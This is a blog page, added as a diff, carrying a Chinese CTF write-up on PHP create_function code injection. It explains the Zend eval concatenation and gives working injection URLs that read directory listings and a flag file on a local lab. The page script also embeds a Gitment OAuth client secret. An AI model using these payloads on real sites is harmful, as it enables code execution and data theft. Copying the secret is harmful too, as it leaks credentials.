@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      create_function任意代码执行 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>create_function任意代码执行</h2>
+  <p class="post-date">2019-03-18 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>一直想把code breaking好好刷一下，虽然吧知道本身能力不足，基本得看看wp。但我认为我能收获的东西却可以很多。通过本节create_function任意代码执行可以在学习下Zend框架,一直认为学好一门语言离不开对源码的分析，这个道理也是在学习java时视频中的老师重复强调的。</p>
+</blockquote>
+<p><img src="./1.png" alt=""></p>
+<p>需要绕过preg_match对传入$action值首字母限制，将url扔入wfuzz，爆出<code>%5c</code>可以绕过<br><img src="./2.png" alt=""></p>
+<p><code>%5c = &#39;\&#39;</code></p>
+<blockquote>
+<p>官方文档解释<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+</blockquote>
+<h1 id="create-function函数实现"><a href="#create-function函数实现" class="headerlink" title="create_function函数实现"></a>create_function函数实现</h1><p><code>/php-src@7.1/Zend/zend_builtin_functions.c</code><br><img src="./3.png" alt=""></p>
+<p>主要看<code>ZEND</code>框架是怎么构造执行<code>create_function</code>函数，代码第16~35调用宏定义<code>memcp</code>y实现对用户传入参数<code>function_args,function_code</code>进行拼接构造成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function  __lambda_func ( function_args ) &#123; function_code &#125; \0</span><br></pre></td></tr></table></figure>
+
+<p>在第38行，函数会被扔到<code>zend_eval_string</code>中执行，相当与php中的eval函数<br>由于代码是简单的拼接</p>
+<p><strong>如果可控在第一个参数，需要闭合圆括号和大括号</strong>：<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code><br><strong>如果可控在第二个参数，需要闭合大括号</strong>：<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></p>
+<h1 id="瞎扯下create-function命名和调用"><a href="#瞎扯下create-function命名和调用" class="headerlink" title="瞎扯下create_function命名和调用"></a>瞎扯下create_function命名和调用</h1><p><img src="./4.png" alt=""></p>
+<p>根据以上源码可知，可总结<code>create_function</code>命名方式为<br>首字符为 <code>&#39;\0&#39;</code> <strong>(PHP中可以使用chr(0))</strong>，防止php中定义同名函数<br>拼接上<code>lambda_%d</code> 。 <code>%d</code>取决于系统中其他匿名函数<br>所以准确来说create_function构造的函数最后长这样</p>
+<p><code>function  \0lambda_%d( function_args ) { function_code } \0</code></p>
+<p>通过以下代码可以反映源码操作实质<br><code>$func</code>多的一个字符就是 <code>\0</code><br><img src="./5.png" alt=""></p>
+<h1 id="Exp构造"><a href="#Exp构造" class="headerlink" title="Exp构造"></a>Exp构造</h1><p>官方例子能够反映原生代码执行情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$newfunc &#x3D; create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) &#x3D; &quot; . log($a * $b);&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function a($a,$b)&#123;</span><br><span class="line">&#39;return &quot;ln($a) + ln($b) &#x3D; &quot; . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>create_function</code>是PHP中创建匿名函数的函数，其第一个参数是匿名函数的参数列表，第二个参数是匿名函数的内容。</p>
+<p>在创建函数的时候，PHP会将用户输入的两个参数拼接成一个完整的PHP代码，并使用eval执行。此时，如果对代码进行闭合，即可直接执行任意代码，如：<code>create_function(&#39;$a, $b&#39;, &#39;}phpinfo();//&#39;);</code><br>可以选择 <code>&#39;//&#39; &#39;{&#39;</code>比和后面的大括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#39;&#39;,$arg)</span><br><span class="line">function a()&#123;</span><br><span class="line">return 1;&#125; print_r(scandir(&#39;..&#x2F;&#39;));&#123;</span><br><span class="line">&#x2F;&#x2F; return 1;&#125; print_r(scandir(&#39;..&#x2F;&#39;));&#x2F;&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}phpinfo();{</code><br><img src="./6.png" alt=""></p>
+<h2 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}print_r(scandir(%27../%27));show_source(%27../flag_h0w2execute_arb1trary_c0de%27);{</code></p>
+<p><code>show_source</code> 可替换为<code>hightlight_file</code></p>
+<p><img src="./7.png" alt=""></p>
+<h2 id="var-dump-file-get-contents"><a href="#var-dump-file-get-contents" class="headerlink" title="var_dump(file_get_contents)"></a>var_dump(file_get_contents)</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}var_dump(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));{</code></p>
+<p><img src="./8.png" alt=""></p>
+<p><a href="https://tricking.io/card/34/content" target="_blank" rel="noopener">create_function注入任意代码</a><br><a href="https://phantom9999.github.io/posts/524450fa.html" target="_blank" rel="noopener">PHP内存管理</a><br><a href="https://xiaohuiyugenius.iteye.com/blog/2160612" target="_blank" rel="noopener">PHP 闭包函数</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#WEB安全" >
+    <span class="tag-code">WEB安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E8%A7%84%E9%81%BF%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/">
+        <span class="nav-arrow">← </span>
+        
+          浏览器同源策略及其规避方法笔记
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/">
+        
+          phpMyAdmin后台LFI-&gt;RCE
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#create-function函数实现"><span class="toc-nav-text">create_function函数实现</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#瞎扯下create-function命名和调用"><span class="toc-nav-text">瞎扯下create_function命名和调用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Exp构造"><span class="toc-nav-text">Exp构造</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#phpinfo"><span class="toc-nav-text">phpinfo()</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#show-source"><span class="toc-nav-text">show_source</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#var-dump-file-get-contents"><span class="toc-nav-text">var_dump(file_get_contents)</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/03/18/create-function任意代码执行/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "create_function任意代码执行",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
